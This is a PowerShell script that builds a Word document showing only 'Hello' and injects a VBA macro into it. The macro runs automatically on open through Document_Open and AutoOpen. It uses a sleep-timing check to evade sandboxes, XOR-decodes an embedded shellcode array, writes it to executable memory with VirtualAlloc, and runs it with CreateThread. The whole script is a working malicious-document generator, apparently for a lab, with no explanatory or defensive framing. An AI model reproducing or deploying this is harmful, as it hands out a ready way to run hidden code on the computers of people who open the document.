$wordApp = New-Object -ComObject Word.Application
$wordApp.Visible = $true
$doc = $wordApp.Documents.Add()
$paragraph = $doc.Content.Paragraphs.Add()
$paragraph.Range.Text = "Hello"

$project = $doc.VBProject
$component = $project.VBComponents.Add([Microsoft.Vbe.Interop.vbext_ComponentType]::vbext_ct_StdModule)

$code = @"
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 2 Then
        Exit Function
    End If

     buf = Array(225, 245, 146, 29, 29, 29, 125, 148, 248, 44, 207, 121, 150, 79, 45, 150, 79, 17, 150, 79, 9, 150, 111, 53, 44, 226, 18, 170, 87, 59, 44, 221, 177, 33, 124, 97, 31, 49, 61, 220, 210, 16, 28, 218, 84, 104, 242, 79, 150, 79, _ 
13, 74, 150, 95, 33, 28, 205, 150, 93, 101, 152, 221, 105, 81, 28, 205, 77, 150, 85, 5, 150, 69, 61, 28, 206, 152, 212, 105, 33, 44, 226, 84, 150, 41, 150, 28, 203, 44, 221, 220, 210, 16, 177, 28, 218, 37, 253, 104, 233, 30, _ 
96, 229, 38, 96, 57, 104, 253, 69, 150, 69, 57, 28, 206, 123, 150, 17, 86, 150, 69, 1, 28, 206, 150, 25, 150, 28, 205, 148, 89, 57, 57, 70, 70, 124, 68, 71, 76, 226, 253, 69, 66, 71, 150, 15, 244, 157, 226, 226, 226, 64, _ 
117, 115, 120, 105, 29, 117, 106, 116, 115, 116, 73, 117, 81, 106, 59, 26, 226, 200, 44, 198, 78, 78, 78, 78, 78, 245, 159, 29, 29, 29, 80, 114, 103, 116, 113, 113, 124, 50, 40, 51, 45, 61, 53, 74, 116, 115, 121, 114, 106, 110, _ 
61, 83, 73, 61, 44, 45, 51, 45, 38, 61, 74, 116, 115, 43, 41, 38, 61, 101, 43, 41, 52, 61, 92, 109, 109, 113, 120, 74, 120, 127, 86, 116, 105, 50, 40, 46, 42, 51, 46, 43, 61, 53, 86, 85, 73, 80, 81, 49, 61, 113, _ 
116, 118, 120, 61, 90, 120, 126, 118, 114, 52, 61, 94, 117, 111, 114, 112, 120, 50, 44, 44, 41, 51, 45, 51, 45, 51, 45, 61, 78, 124, 123, 124, 111, 116, 50, 40, 46, 42, 51, 46, 43, 61, 88, 121, 122, 50, 44, 44, 41, 51, _ 
45, 51, 44, 37, 47, 46, 51, 40, 44, 29, 117, 39, 75, 100, 186, 226, 200, 78, 78, 119, 30, 78, 78, 117, 166, 28, 29, 29, 245, 217, 29, 29, 29, 50, 118, 71, 42, 121, 66, 87, 42, 120, 120, 42, 104, 44, 113, 42, 78, 74, _ 
45, 82, 118, 115, 92, 106, 37, 108, 94, 127, 44, 48, 36, 36, 113, 106, 110, 48, 120, 109, 92, 48, 72, 42, 122, 124, 73, 119, 77, 69, 47, 37, 75, 114, 86, 29, 77, 117, 74, 148, 130, 219, 226, 200, 148, 219, 78, 117, 29, 47, _ 
245, 153, 78, 78, 78, 74, 78, 75, 117, 246, 72, 51, 38, 226, 200, 139, 119, 23, 66, 117, 157, 46, 29, 29, 148, 253, 119, 25, 77, 119, 2, 75, 117, 104, 91, 131, 155, 226, 200, 78, 78, 78, 78, 75, 117, 48, 27, 5, 102, 226, _ 
200, 152, 221, 104, 9, 117, 149, 14, 29, 29, 117, 89, 237, 40, 253, 226, 200, 82, 104, 208, 245, 86, 29, 29, 29, 119, 93, 117, 29, 13, 29, 29, 117, 29, 29, 93, 29, 78, 117, 69, 185, 78, 248, 226, 200, 142, 78, 78, 148, 250, _ 
74, 117, 29, 61, 29, 29, 78, 75, 117, 15, 139, 148, 255, 226, 200, 152, 221, 105, 210, 150, 26, 28, 222, 152, 221, 104, 248, 69, 222, 66, 245, 118, 226, 226, 226, 44, 36, 47, 51, 44, 43, 37, 51, 41, 40, 51, 44, 36, 45, 29, _ 
166, 253, 0, 55, 23, 117, 187, 136, 160, 128, 226, 200, 33, 27, 97, 23, 157, 230, 253, 104, 24, 166, 90, 14, 111, 114, 119, 29, 78, 226, 200)

    for i = 0 To UBound(buf)
        buf(i) = buf(i) Xor 29
    Next i   

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)

End Function

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub

"@

$component.CodeModule.AddFromString($code)

$filepath = "c:\users\ds_wa\desktop\backtothelab.doc"
$doc.SaveAs2($filepath,[Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatDocument97)
$wordApp.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($wordApp) | Out-Null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()